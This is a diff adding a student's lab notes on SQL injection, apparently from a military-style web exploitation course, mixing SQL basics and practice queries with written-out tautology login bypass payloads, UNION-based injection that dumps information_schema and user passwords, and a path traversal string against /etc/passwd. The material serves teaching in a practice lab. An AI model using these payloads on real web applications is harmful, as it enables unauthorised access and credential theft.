@@ -788,39 +788,376 @@ view_image.php?file=../../etc/passwd
 
 
 
+# Web Exploitation Day 2
+https://sec.cybbh.io/public/security/latest/lessons/lesson-5-sql_sg.html
+https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/05-sql-injection-slides.html
+
+
+## What is SQL Commands
+S tructured Q uery L anguage - ANSI Standard
+
+Commands, such as below, are standardized across vendors, and can accomplish almost all tasks inside a Database:
+SELECT
+UPDATE
+DELETE
+CREATE
+DROP
+
+SELECT UNION
+UNION SELECT
+
+Basic SQL Commands:
+Command
+	
+```
+Usage
+
+USE               Select the database to use**
+SELECT            Extract data from a database
+UPDATE            Update data in a database
+DELETE            Delete data from a database
+INSERT INTO       Insert new data into a database
+CREATE DATABASE   Create a new database
+ALTER DATABASE    Modify an existing database
+CREATE TABLE      Create a new table
+ALTER TABLE       Modify an existing table
+DROP TABLE        Delete a table
+CREATE INDEX      Create an index (search key)
+DROP INDEX        Delete an index
+UNION             Combine the result-set of two or more equal SELECT statements**
+```
+https://www.w3schools.com/SQL/sql_syntax.asp
+
+
+
+## SQL Commands DEMO
+
+```
+SHOW databases;
+SHOW TABLES FROM session;
+SELECT * FROM session.car;
+USE session;
+SHOW Tables;
+DESCRIBE car;
+SELECT * FROM car;
+SELECT * FROM car UNION SELECT tireid,name,size,cost,1,2 FROM Tires;
+
+```
+
+## SQL Command DEMO SSgt DOW GOLDEN STATEMENT
+ 
+```
+get into a SQL server
+mysql
+
+query the databases on the SQL server
+show database; (top three will be the default)
+
+how to use the databases from the show command
+use information_schema; (will drop you into the directory)
+
+will show tables and information about the database
+show columns from columns;
+TABLE_CATALOG
+TABLE_SCHEMA
+TABLE_NAME
+COLUMN_NAME
+
+within information_schema database and columns tables show me table_names for all databases
+select table_name from information_schema.columns;
+
+you can add to your select to pull more information
+select table_name,column_name from information_schema.columns;
+
+added table_schema to the command
+select table_schema,table_name,column_name from information_schema.columns;
+
+
+
+
+
+show databases;
+
+show tables from session;
+
+show columns from session.Tires;
+
+select tireid,name,size from session.Tires
+
+select tireid,name,size from session.Tires UNION SELECT
+
+
+
+
+show columns from session.car
+
+select tireid,name,size from session.Tires UNION SELECT name,type,cost from session.car
+^ Will dump the information from the select fields from both session.Tire and session.car
+
+select tireid,name,size,4 from session.Tires UNION SELECT name,type,cost,color from session.car
+^ The 4 allows you to call an uneven amount of arguments and it not error out
+
+```
+
+
+
+## SQL Bot Practice
+
+
+
+
+```
+Find the movie with a row id of 6 ✓
+
+select title from movies where id=6
+
+
+Find the movies released in the years between 2000 and 2010
+
+select title from movies where year between 2000 and 2010;
+
+
+Find the movies not released in the years between 2000 and 2010
+
+select title from movies where year not between 2000 and 2010;
+
+
+Find the first 5 Pixar movies and their release year
+
+SELECT title, year FROM movies
+WHERE year <= 2003;
+
+
+
+
+
+Find all the Toy Story movies ✓
+SELECT title, director FROM movies 
+WHERE title LIKE "Toy Story%";
+
+Find all the movies directed by John Lasseter
+SELECT title FROM movies 
+WHERE director = "John Lasseter";
+
+Find all the movies (and director) not directed by John Lasseter
+SELECT title,director FROM movies 
+WHERE director != "John Lasseter";
+
+Find all the WALL-* movies
+SELECT title FROM movies 
+WHERE title LIKE "WALL%";
 
 
 
 
 
 
+List all directors of Pixar movies (alphabetically), without duplicates ✓
+SELECT DISTINCT director FROM movies
+ORDER BY director ASC;
+
+List the last four Pixar movies released (ordered from most recent to least)
+SELECT title, year FROM movies
+ORDER BY year DESC
+LIMIT 4;
+
+List the first five Pixar movies sorted alphabetically
+SELECT title from movies
+order by title asc
+limit 5;
+
+List the next five Pixar movies sorted alphabetically
+SELECT title from movies
+order by title asc
+limit 5 offset 5;
 
 
 
 
 
 
+List all the Canadian cities and their populations ✓
+SELECT city,population FROM north_american_cities
+where country = "Canada";
+
+Order all the cities in the United States by their latitude from north to south
+select city from north_american_cities
+where country = "United States"
+order by latitude desc;
+
+List all the cities west of Chicago, ordered from west to east
+SELECT city, longitude FROM north_american_cities
+WHERE longitude < -87.629798
+ORDER BY longitude ASC;
+
+List the two largest cities in Mexico (by population)
+select city from north_american_cities
+where country = "Mexico"
+order by population desc
+limit 2;
+
+List the third and fourth largest cities (by population) in the United States and their population
+select city from north_american_cities
+where country = "United States"
+order by population desc
+limit 2 offset 2;
 
 
 
 
 
+Find the domestic and international sales for each movie ✓
+SELECT title, domestic_sales, international_sales 
+FROM movies
+  JOIN boxoffice
+    ON movies.id = boxoffice.movie_id;
+
+Show the sales numbers for each movie that did better internationally rather than domestically
+SELECT title, domestic_sales, international_sales
+FROM movies
+  JOIN boxoffice
+    ON movies.id = boxoffice.movie_id
+WHERE international_sales > domestic_sales;
+
+List all the movies by their ratings in descending order
+
+```
+
+## SQL Injection Considerations (CMD)
+
+BEFORE INPUT:
+
+SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
+
+
+AFTER INPUT:
+
+SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
+
+
+
+User enters tom' OR 1='1 in the name and pass fields.
+
+
+Truth Statement: tom ' OR 1='1
+
+
+Server-Side query executed would appear like this:
+
+
+SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
 
 
 
 
+## Authentication BYPASS using LOGIN (DEMO)
+
+
+Identify we have USER LOGIN Page
+NOT SURE WHICH FIELD CAN BE EXPLOITED
+PASS TRUTH STATEMENT INTO FIELDS
+POST METHOD IS TRYING THE LOGIN FIELDS
+GET METHOD IS SENDING TO URL
+LOGIN-> INSPECT -> COPY FROM POST REQUEST RAW TAB-> COPY INTO URL
+http://x.x.x.x/login.php/?{PASTE}
+Access to CREDENTIALS
+
+
+username: ' OR 1='1
+password: ' OR 1='1
 
 
 
+inspect -> network tab -> send login again
+
+inspect -> network -> Request - raw radial button
+
+Copy Request information from POST REQUEST 
+
+paste in URL http://x.x.x.x/login.php/?{PASTE}
+
+Gets us credentials:
 
 
+```
+Array
+(
+    [0] => Luke_Skywalker
+    [name] => Luke_Skywalker
+    [1] => Jedi
+    [pass] => Jedi
+)
+1Array
+(
+    [0] => Darth_Vader
+    [name] => Darth_Vader
+    [1] => Sith
+    [pass] => Sith
+)
+1Array
+(
+    [0] => c3p0
+    [name] => c3p0
+    [1] => annoying
+    [pass] => annoying
+)
+1Array
+(
+    [0] => Batman
+    [name] => Batman
+    [1] => BWyane
+    [pass] => BWyane
+)
+1
+```
 
 
+## GOLDEN STATEMENT (CMD)
+```
+select table_schema,table_name,column_name from information_schema.columns;
+```
+
+## UNION.HTML (DEMO)
+
+1. Identify Vulnerable Field
+Interact normally to see how it works
+Pass truth statements to each to see if vulnerable
+Ford\' OR 1='1\
+Dodge\' OR 1='1\
+Honda\' OR 1='1\
+Audi' OR 1='1          * VULNERABLE FIELD
 
 
+2. Identify number of columns
+Audi' UNION SELECT 1,2,3,4,5 # 
+We see 1 3 4 5
+So we use our GOLDEN STATEMENT AND modify it so we do not error out
+
+Audi'  UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
+
+Sessions
+	Tires
+ 		tireid
+   		name
+		size
+		cost
+  	car	
+   		cost
+     		name
+       		type
+
+  	userinfo
+		studentID
+  		username
+		passwd
 
 
+ Audi' UNION SELECT username,2,passwd,jump,5 from session.userinfo #
+This command would query inside userinfo to pull username, passwd, jump information from session.userinfo
 
+
+Audi' UNION SELECT tireid,2,name,size,5 from session.Tires #
+pulls information from session.Tires on tireid,name,and size
 
 
 
